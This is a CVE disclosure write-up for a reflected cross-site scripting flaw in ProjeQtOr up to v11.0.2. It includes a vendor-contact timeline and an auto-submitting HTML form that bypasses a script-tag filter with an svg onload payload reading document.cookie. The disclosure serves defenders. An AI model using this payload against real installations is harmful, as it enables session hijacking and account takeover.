[**CVE-2023-49034.md**](#file-cve-2023-49034-md)

# CVE-2023-49034

## Description

A reflected XSS vulnerability via a POST request to /tool/ack.php affecting all ProjectOr versions up to v11.0.2 (unpatched)

## Additional Information

It was possible to bypass the very basic and incomplete security measure (detection of the <script> tag) that exists in the checkValidHtmlText() function of the /model/Security.php file of the solution.

## Timeline

* 30-10-2023: Vulnerability identified during a client pentest
* 07-11-2023: 1st vendor contact attempt via website form
* 17-11-2023: CVE requested
* 19-11-2023: 2nd vendor contact attempt via email
* 24-11-2023: CVE assigned
* 10-01-2024: 3rd vendor contact attempt via support forum
* 06-02-2024: Public disclosure requested

## Proof of Concept

Create an HTML file with the following auto-submitting form:

```
<html>
  <body>
    <form action="https://demo.projeqtor.org/tool/ack.php" method="POST">
      <input type="hidden" name="resultAck" value="&lt;svg/onload=alert(document.cookie)&gt;" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Opening the file (on an authenticated session) will send the POST request that injects and executes the PoC Javascript code (printing cookies in an alert).

## Vulnerability Type

Cross Site Scripting (XSS)

## Vendor of Product

ProjeQtOr

## Affected Component

/tool/ack.php, /model/Security.php
